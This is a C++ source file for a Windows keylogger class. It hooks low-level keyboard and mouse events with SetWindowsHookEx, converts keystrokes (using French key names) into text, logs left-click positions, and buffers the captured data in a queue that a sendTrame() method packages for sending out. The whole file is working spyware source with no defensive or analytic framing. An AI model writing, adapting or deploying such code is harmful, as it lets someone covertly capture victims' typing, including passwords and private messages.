#include <Keylogger.hh>

static HHOOK					keyHook;
static HHOOK					mouseHook;
static std::queue<std::string>	logClient;
static boost::mutex				logMutex;

Keylogger::Keylogger() : _data("")
{
}

Keylogger::~Keylogger()
{
}

__declspec(dllexport) LRESULT CALLBACK Keylogger::handlekeys(int code, WPARAM wp, LPARAM lp)
{
	if (!(code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)))
		return (CallNextHookEx(keyHook, code, wp, lp));

	static bool		capslock = false;
	static bool		shift = false;
	char			tmp[0xFF] = {0};
	DWORD			msg =	1;
	KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
	bool			printable;

	msg += (st_hook.scanCode << 16);
	msg += (st_hook.flags << 24);
	GetKeyNameText(msg, tmp, 0xFF);
	std::string str = std::string(tmp);

	printable = (str.length() <= 1) ? true : false;

	if (!printable) 
	{
		if (str == "VERR.MAJ")
			capslock = !capslock;
		else if (str == "MAJ")
			shift = true;
		if (str == "ENTRER") 
		{
			str = "\n";
			printable = true;
		}
		else if (str == "ESPACE") 
		{
			str = " ";
			printable = true;
		}
		else if (str == "TAB") 
		{
			str = "\t";
			printable = true;
		}
		else 
		{
			str = ("[" + str + "]");
		}
	}

	if (printable) 
	{
		if (shift == capslock) 
		{ 
			for (size_t i = 0; i < str.length(); ++i)
				str[i] = tolower(str[i]);
		}
		else 
		{ 
			for (size_t i = 0; i < str.length(); ++i) 
			{
				if (str[i] >= 'A' && str[i] <= 'Z') 
				{
					str[i] = toupper(str[i]);
				}
			}
		}
		shift = false;
	}
	for (size_t i = 0; i < str.length(); ++i)
	{
		if (str[i] < 32 || str[i] > 126)
			str[i] = '?';
	}

	logMutex.lock();
	logClient.push(str);
	logMutex.unlock();
	return CallNextHookEx(keyHook, code, wp, lp);
}

__declspec(dllexport) LRESULT CALLBACK Keylogger::handlemouse(int code, WPARAM wp, LPARAM lp)
{
	MOUSEHOOKSTRUCT*	mouseHookStruct = (MOUSEHOOKSTRUCT*) lp;
	if (mouseHookStruct)
	{
		if (wp == WM_LBUTTONDOWN)
		{
			std::ostringstream ostr;
			ostr << "[Left Click " << mouseHookStruct->pt.x << "," << mouseHookStruct->pt.y << "]";
			logMutex.lock();
			logClient.push(ostr.str());
			logMutex.unlock();
		}
	}
	return CallNextHookEx(mouseHook, code, wp, lp);
}

bool Keylogger::init()
{
	this->_moduleHandle = GetModuleHandle(NULL);
	keyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Keylogger::handlekeys, this->_moduleHandle, NULL);
	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)Keylogger::handlemouse, this->_moduleHandle, NULL);
	return (true);
}

std::string* Keylogger::sendTrame()
{
	logMutex.lock();
	while (!logClient.empty())
	{
		this->_data += logClient.front();
		logClient.pop();
	}
	logMutex.unlock();
	if (this->_data.size() <= 1)
		return (NULL);
	std::string* data = new std::string(this->_data);
	this->_data.clear();
	return (data);
}
